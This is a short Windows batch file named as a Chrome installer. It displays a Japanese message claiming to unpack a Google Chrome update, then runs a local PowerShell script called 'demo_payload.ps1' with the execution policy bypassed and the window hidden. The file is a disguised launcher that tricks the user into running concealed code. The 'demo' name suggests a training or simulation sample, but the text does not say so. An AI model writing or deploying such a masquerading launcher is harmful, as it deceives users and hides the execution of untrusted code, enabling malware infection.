@echo off
:: Chrome_Installer.bat
echo Google Chromeの更新ファイルを展開中...
:: PowerShellを隠しウィンドウで実行し、カレントフォルダのps1を呼び出す
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "demo_payload.ps1"
exit